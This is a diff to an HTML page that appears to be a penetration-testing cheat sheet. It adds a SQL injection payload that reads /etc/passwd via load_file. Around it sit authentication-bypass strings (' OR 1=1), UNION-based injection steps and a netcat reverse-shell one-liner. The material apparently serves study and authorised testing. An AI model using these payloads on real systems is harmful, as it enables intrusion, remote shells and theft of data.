@@ -318,13 +318,14 @@ nc -e /bin/sh 10.20.14 8080<br>
     <h2><li>SQL Injection exploitation</li></h2>
     <a href="#sql-injection-vuln">[jump to vulnerability]</a><br><br>
     <p><ol>Some simple SQL command: <ol>1. database()  -- To see database name.</ol>
-                                    <ol>2. </ol>
+                                    <ol>2. load_file('etc/passwd') -- To read system file</ol>
     </ol></p>
     <h3>Bypass Authenitcation with SQL injection</h3>
     <p>bypass common auth vulnerability using: <i>' OR 1=1;-- </i></p>
     <p>bypass common auth vulnerability using: <i>' OR 1=1# </i></p>
     <p>*** sometimes some characters are filted. In that case, sent modified payload using burp proxy</p>
     <h3>Exploit error-based SQL injection</h3>
+    <p>Inject code in paramater. </p>
     <p>use <i>ORDER BY [random_number]</i> -- To check how many columns exist on that database.<br>
     use <i>UNION SELECT [col1,col2,...]</i> -- To see vulnerable columns.<br>
     use <i>UNION SELECT 1,2,database()</i> -- To see database name.<br>
